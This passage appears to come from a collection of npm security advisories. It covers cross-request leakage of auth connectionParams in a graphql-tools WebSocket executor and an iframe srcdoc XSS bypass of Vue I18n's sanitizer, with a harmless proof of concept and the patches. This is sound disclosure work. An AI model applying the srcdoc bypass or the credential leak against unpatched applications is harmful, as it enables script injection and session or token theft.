  executorConnectionParams = {};
}
```

Alternative, and the more complete form: stop accumulating into shared closure state at all — derive the payload per request, e.g. `const payload = { ...options.connectionParams, ...(request.extensions?.['connectionParams'] ?? {}) }`, passed down to the `onopen` handler for that connection rather than read from the executor closure.

Notes:

- `executor[Symbol.dispose]()` is bound to `cleanupWebsocket`, so fixing the reset there also makes the documented teardown behave as callers expect.
- `Object.assign` merges rather than replaces, so a later request supplying *some* parameters still inherits the keys it omits; a fix that only replaces the object on the "present" branch would leave this half-open.
- The `UrlLoader` path in this repository constructs a fresh executor per request and is already safe; no change is needed there. The exposure is to direct consumers of the exported `buildWSLegacyExecutor`.
- It would also help to define explicitly whether mixing distinct auth contexts on one executor is supported, and to reject it if not — today the factory returns a general `Executor` with no stated per-identity restriction.

Suggested regression test alongside the package's existing legacy-ws executor tests (the exact spec file is **not verified** by the available information): drive one executor against a recording server, send request 1 with `extensions.connectionParams = { Authorization: 'Bearer victim-token' }`, let it complete, then send request 2 with no `connectionParams`, and assert the second `connection_init` payload contains no `Authorization` key. Add a second case where request 2 supplies only `{ tenant: 'other' }` and assert the payload is exactly `{ tenant: 'other' }` plus base options.

## Disclosure status

Currently undisclosed: no CVE, GHSA, advisory URL, upstream issue, or fix commit is associated with this finding, and no fixed version exists to upgrade to.

## Resolution

Fixed in `@graphql-tools/executor-legacy-ws@1.1.36`, which is published on npm. Each execution opens its own socket. `connection_init` is built from the executor's base `connectionParams` plus only that request's `extensions.connectionParams`. Upgrade to `>=1.1.36`.

References:
- https://github.com/ardatan/graphql-tools/security/advisories/GHSA-434m-5hcj-pxf3 [WEB]
- https://github.com/ardatan/graphql-tools/pull/8480 [WEB]
- https://github.com/ardatan/graphql-tools/commit/c2f226e6f68236be9e4a577f29faeaa92547458b [WEB]
- https://github.com/ardatan/graphql-tools [PACKAGE]
- https://github.com/ardatan/graphql-tools/releases/tag/@graphql-tools/executor-legacy-ws@1.1.36 [WEB]

### GHSA-83rm-6c8r-g728 — Vue I18n: escapeParameter does not prevent XSS through srcdoc in translation messages
- Aliases: CVE-2026-118257 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-116, CWE-79
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N`
- Affected npm/vue-i18n:  versions: 9.14.5
- Affected npm/vue-i18n:  versions: 10.0.8

- Affected npm/@intlify/core-base: introduced:12.0.0-alpha.4 fixed:12.0.0-alpha.5 versions: 12.0.0-alpha.4
- Affected npm/@intlify/core:  versions: 9.14.5
- Affected npm/@intlify/core:  versions: 10.0.8
- Affected npm/@intlify/core: introduced:11.1.10 fixed:11.4.14
- Affected npm/@intlify/core: introduced:12.0.0-alpha.4 fixed:12.0.0-alpha.5 versions: 12.0.0-alpha.4
- Affected npm/@intlify/vue-i18n-core:  versions: 9.14.5
- Affected npm/@intlify/vue-i18n-core:  versions: 10.0.8
- Affected npm/@intlify/vue-i18n-core: introduced:11.1.10 fixed:11.4.14
- Affected npm/@intlify/vue-i18n-core: introduced:12.0.0-alpha.4 fixed:12.0.0-alpha.5 versions: 12.0.0-alpha.4
- Affected npm/@intlify/shared:  versions: 9.14.5
- Affected npm/@intlify/shared:  versions: 10.0.8
- Affected npm/@intlify/shared: introduced:11.1.10 fixed:11.4.14
- Affected npm/@intlify/shared: introduced:12.0.0-alpha.4 fixed:12.0.0-alpha.5 versions: 12.0.0-alpha.4

### Summary

When `escapeParameter` is enabled (`escapeParameterHtml` in the Legacy API), Vue I18n passes the translated string through `sanitizeTranslatedHtml()`. The sanitizer escapes `<` and `>` in attribute values and neutralizes event handler attributes such as `onerror`, but it does not handle the `srcdoc` attribute of `<iframe>`.

The value of `srcdoc` is an HTML document: the browser decodes the character references in it and parses the result as a nested document in the same origin. The escaping and the neutralization done by the sanitizer are both character references, so they are undone inside `srcdoc`. This bypasses the fix for CVE-2025-53892 (GHSA-x8qp-wqqm-57ph).

### Details

`sanitizeTranslatedHtml()` ([`packages/shared/src/sanitize.ts` in v11.4.13](https://github.com/intlify/vue-i18n/blob/v11.4.13/packages/shared/src/sanitize.ts#L126-L162)) works on the final translated string:

1. It escapes `<`, `>`, `"` and `'` inside quoted attribute values.
2. It rewrites the `on` of event handler attributes to `&#111;n`.
3. It replaces `javascript:` URLs in `href`, `src`, `action` and `formaction` with `about:blank`.

Inside `srcdoc`, steps 1 and 2 only produce character references, which the browser decodes before parsing the value as a document. Markup inside `srcdoc` therefore survives the sanitizer, with escaping or without it.

This can be reached in three ways:

- **A parameter inside `srcdoc`.** With a message such as `<iframe srcdoc="{content}"></iframe>`, `escapeParameter` escapes `content` into character references, and the browser decodes them again.
- **Markup in a message.** A message that contains an `<iframe srcdoc="...">` keeps it after sanitizing. The documentation asks not to use HTML messages with content from users, but it also says that the sanitizer neutralizes event handlers in the final HTML.
- **Together with GHSA-8rc2-428q-7ww3.** When a call passes a list and named values, the named values are not escaped. An `<iframe srcdoc="...">` in a named value then reaches the sanitizer as markup, even with an ordinary message such as `{0} {name}`.

### PoC

```js
import { createI18n } from 'vue-i18n'

const i18n = createI18n({
  legacy: false,
  locale: 'en',
  escapeParameter: true,
  messages: {
    en: { message: '<iframe srcdoc="<b>x</b>"></iframe>' }
  }
})

console.log(i18n.global.t('message'))
// v11.4.13: <iframe srcdoc="&lt;b&gt;x&lt;/b&gt;"></iframe>
```

The browser decodes the value and renders `<b>x</b>` as a separate document inside the `<iframe>`, in the same origin as the page. Any markup in that position is parsed the same way.

### Impact

Applications are affected when they enable `escapeParameter`, render translations as HTML (for example with `v-html`), and one of the following applies:

- an untrusted value is passed as a parameter that the message places inside `srcdoc`,
- message content is not fully trusted (for example crowdsourced or stored translations), or
- untrusted named values are passed in the same call as a list (GHSA-8rc2-428q-7ww3).

An attacker can then run script in the origin of the application (DOM-based XSS), despite the sanitizer.

Rendering through `<i18n-t>` is not affected, since it does not render translations as HTML.

### Patches

Fixed in 11.4.14 and 12.0.0-alpha.5. The sanitizer now neutralizes the `srcdoc` attribute itself, in the same way as event handler attributes.

v9 and v10 are no longer supported and will not be fixed. Please migrate to v11.

### Workarounds

- Do not render translations that can contain untrusted content with `v-html`. Use component interpolation (`<i18n-t>`) instead.
- Do not put `srcdoc` in translation messages, and do not pass values into it.

### References

- [CWE-79](https://cwe.mitre.org/data/definitions/79.html), [CWE-116](https://cwe.mitre.org/data/definitions/116.html)
- [GHSA-x8qp-wqqm-57ph](https://github.com/intlify/vue-i18n/security/advisories/GHSA-x8qp-wqqm-57ph) (CVE-2025-53892): the fix that added `sanitizeTranslatedHtml()`
- [GHSA-8rc2-428q-7ww3](https://github.com/intlify/vue-i18n/security/advisories/GHSA-8rc2-428q-7ww3): named values are not escaped when a list is also passed
- [HTML Standard: the `srcdoc` attribute](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-srcdoc)

References:

- https://github.com/intlify/vue-i18n/pull/2679 [WEB]
- https://github.com/intlify/vue-i18n/commit/43391d20e7c85403cb59bdb21b5d542819f54042 [WEB]
